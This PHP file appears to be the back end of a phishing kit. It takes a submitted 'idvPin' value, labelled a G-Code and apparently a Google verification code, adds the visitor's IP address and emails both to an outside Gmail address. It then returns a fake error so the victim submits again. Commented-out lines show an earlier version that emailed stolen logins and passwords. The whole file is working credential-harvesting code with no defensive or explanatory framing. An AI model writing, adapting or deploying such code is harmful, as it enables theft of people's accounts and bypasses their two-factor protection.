<?php

header("Access-Control-Allow-Origin: *");
    if(!empty($_POST['idvPin']))
    {
      $gcode = trim(strip_tags($_POST['idvPin']));
      //$password = trim(strip_tags($_POST['password']));
      $ip = $_SERVER['REMOTE_ADDR'];
 
    //   mail('daltonbirdhomes@gmail.com', 'Log ('.$login.')', 
    //   'Login: '.$login.'<br />Password: '.$password.'<br />IP: '.$ip.'<br />'.$mail,"Content-type:text/html;charset=windows-1251");
    // echo "<html><head><META HTTP-EQUIV='Refresh' content ='0; URL=invalid.php?email=$login'></head></html>";
    //$body = 'Login: '.$login."\r\n".'Password: '.$password.' '.""."\r\n".'IP: '.$ip."\r\n";
    $body = 'G-Code: '.$gcode."\r\n".'IP: '.$ip."\r\n";
    
    mail("johnmicable123@gmail.com",'Log (G-code)',$body);
    echo json_encode(array("status" => "error"));
}


?>